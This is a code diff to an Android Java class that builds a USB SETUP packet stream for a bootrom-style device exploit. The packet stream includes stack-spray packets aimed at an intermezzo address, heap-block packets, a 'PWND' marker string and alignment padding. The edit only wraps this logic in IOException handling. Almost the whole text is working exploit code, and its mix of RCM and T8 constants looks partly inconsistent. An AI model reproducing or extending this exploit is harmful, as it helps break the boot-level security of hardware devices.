@@ -12,6 +12,7 @@ import android.hardware.usb.UsbInterface;
 import android.hardware.usb.UsbManager;
 
 import java.io.ByteArrayOutputStream;
+import java.io.IOException;
 import java.util.Arrays;
 
 public class PrimaryLoader implements USBDevHandler {
@@ -210,74 +211,79 @@ public class PrimaryLoader implements USBDevHandler {
     private byte[] buildSetupPacketStream(int maxLength, long rcmAddr, long intermezzoLoc, long payloadBlock, Context context) {
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
 
-        stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
-                REQUEST_HEADER,
-                maxLength & 0xFFFF,
-                (maxLength >> 16) & 0xFFFF,
-                0));
-        Logger.log(context, "[*] Added initial setup packet encoding MAX_LENGTH=" + maxLength);
-
-        int reservedPackets = (676 + 7) / 8;
-        for (int i = 0; i < reservedPackets; i++) {
-            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
-                    REQUEST_RESERVED,
-                    0,
-                    0,
-                    0));
-        }
-        Logger.log(context, "[*] Added " + reservedPackets + " reserved SETUP packets");
-
-        int stackFillCount = (int) ((intermezzoLoc - rcmAddr) / 4);
-        for (int i = 0; i < stackFillCount; i++) {
-            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
-                    REQUEST_STACK_SPRAY,
-                    (int) (intermezzoLoc & 0xFFFF),
-                    (int) ((intermezzoLoc >> 16) & 0xFFFF),
-                    0));
-        }
-        Logger.log(context, "[*] Added " + stackFillCount + " stack spray SETUP packets");
-
-        for (long blk : T8Constants.HEAP_BLOCKS) {
-            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
-                    REQUEST_HEAP_BLOCK,
-                    (int) (blk & 0xFFFF),
-                    (int) ((blk >> 16) & 0xFFFF),
-                    0));
-        }
-        Logger.log(context, "[*] Added " + T8Constants.HEAP_BLOCKS.length + " heap block SETUP packets");
-
         try {
-            byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
-            for (int i = 0; i < pw.length; i += 4) {
-                int chunk = 0;
-                for (int j = 0; j < 4 && i + j < pw.length; j++) {
-                    chunk |= (pw[i + j] & 0xFF) << (8 * j);
-                }
+            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
+                    REQUEST_HEADER,
+                    maxLength & 0xFFFF,
+                    (maxLength >> 16) & 0xFFFF,
+                    0));
+            Logger.log(context, "[*] Added initial setup packet encoding MAX_LENGTH=" + maxLength);
+
+            int reservedPackets = (676 + 7) / 8;
+            for (int i = 0; i < reservedPackets; i++) {
                 stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
-                        REQUEST_PWND,
-                        chunk & 0xFFFF,
-                        (chunk >> 16) & 0xFFFF,
+                        REQUEST_RESERVED,
+                        0,
+                        0,
                         0));
             }
-            Logger.log(context, "[*] Added PWND string as explicit SETUP payload packets");
-        } catch (Exception e) {
-            Logger.log(context, "[-] Failed to append PWND string as SETUP packets: " + e.toString());
-        }
+            Logger.log(context, "[*] Added " + reservedPackets + " reserved SETUP packets");
 
-        int paddingPackets = (int) ((payloadBlock - intermezzoLoc) / 8);
-        paddingPackets = Math.max(0, paddingPackets);
-        for (int i = 0; i < paddingPackets; i++) {
-            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
-                    REQUEST_PADDING,
-                    0,
-                    0,
-                    0));
-        }
-        Logger.log(context, "[*] Added " + paddingPackets + " padding SETUP packets to align to payload block");
+            int stackFillCount = (int) ((intermezzoLoc - rcmAddr) / 4);
+            for (int i = 0; i < stackFillCount; i++) {
+                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
+                        REQUEST_STACK_SPRAY,
+                        (int) (intermezzoLoc & 0xFFFF),
+                        (int) ((intermezzoLoc >> 16) & 0xFFFF),
+                        0));
+            }
+            Logger.log(context, "[*] Added " + stackFillCount + " stack spray SETUP packets");
 
-        byte[] streamBytes = stream.toByteArray();
-        Logger.log(context, "[*] Built " + (streamBytes.length / 8) + " explicit SETUP packets (" + streamBytes.length + " bytes)");
-        return streamBytes;
+            for (long blk : T8Constants.HEAP_BLOCKS) {
+                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
+                        REQUEST_HEAP_BLOCK,
+                        (int) (blk & 0xFFFF),
+                        (int) ((blk >> 16) & 0xFFFF),
+                        0));
+            }
+            Logger.log(context, "[*] Added " + T8Constants.HEAP_BLOCKS.length + " heap block SETUP packets");
+
+            try {
+                byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
+                for (int i = 0; i < pw.length; i += 4) {
+                    int chunk = 0;
+                    for (int j = 0; j < 4 && i + j < pw.length; j++) {
+                        chunk |= (pw[i + j] & 0xFF) << (8 * j);
+                    }
+                    stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
+                            REQUEST_PWND,
+                            chunk & 0xFFFF,
+                            (chunk >> 16) & 0xFFFF,
+                            0));
+                }
+                Logger.log(context, "[*] Added PWND string as explicit SETUP payload packets");
+            } catch (Exception e) {
+                Logger.log(context, "[-] Failed to append PWND string as SETUP packets: " + e.toString());
+            }
+
+            int paddingPackets = (int) ((payloadBlock - intermezzoLoc) / 8);
+            paddingPackets = Math.max(0, paddingPackets);
+            for (int i = 0; i < paddingPackets; i++) {
+                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
+                        REQUEST_PADDING,
+                        0,
+                        0,
+                        0));
+            }
+            Logger.log(context, "[*] Added " + paddingPackets + " padding SETUP packets to align to payload block");
+
+            byte[] streamBytes = stream.toByteArray();
+            Logger.log(context, "[*] Built " + (streamBytes.length / 8) + " explicit SETUP packets (" + streamBytes.length + " bytes)");
+            return streamBytes;
+        } catch (IOException e) {
+            Logger.log(context, "[-] IOException building SETUP packet stream: " + e.toString());
+            return new byte[0];
+        }
     }
 
     private byte[] makeSetupPacket(int requestType, int request, int value, int index, int length) {
